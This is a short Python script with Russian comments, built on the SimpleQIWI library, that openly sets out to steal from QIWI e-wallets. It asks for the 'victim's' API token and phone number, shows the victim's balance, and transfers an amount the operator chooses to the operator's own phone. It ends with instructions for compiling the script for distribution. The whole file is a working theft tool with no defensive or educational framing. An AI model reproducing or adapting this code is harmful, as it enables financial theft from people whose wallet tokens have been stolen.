########################################################
#Данный софт создан SeRgEy
#Информация взята https://github.com/Emberium/SimpleQIWI
#Программа создана 12.08.2019
#Версия программы 1.0
########################################################

from SimpleQIWI import *

print("____       ____       _____")
print("/ ___|  ___|  _ \ __ _| ____|   _")
print("\___ \ / _ \ |_) / _` |  _|| | | |")
print(" ___) |  __/  _ < (_| | |__| |_| |")
print("|____/ \___|_| \_\__, |_____\__, |")
print("                 |___/      |___/ ") 
print(" ____   ___  _____ _____")
print("/ ___| / _ \|  ___|_   _|")
print("\___ \| | | | |_    | |")
print(" ___) | |_| |  _|   | |")
print("|____/ \___/|_|     |_|")
print("")

token = input ("Введите токен жертвы:") # Soft by $eRgEy 
phone = input ("Введите телефон жертвы:")#этот пункт пропускается нажатием Enter
api = QApi(token=token, phone=phone) 
print(api.balance) 
summa = input ("Введите сумму:") 
phone1 = input ("Введите ваш телефон:") 
coment = input ("Коментарий:") 
api.pay(account=phone1, amount=summa, comment=coment) 
print(api.balance) 
input() 

########################################################
#Компиляция:
#python -m compileall <file_1>.py
#после окончания компилирования файл будет в папке __pycache__
########################################################
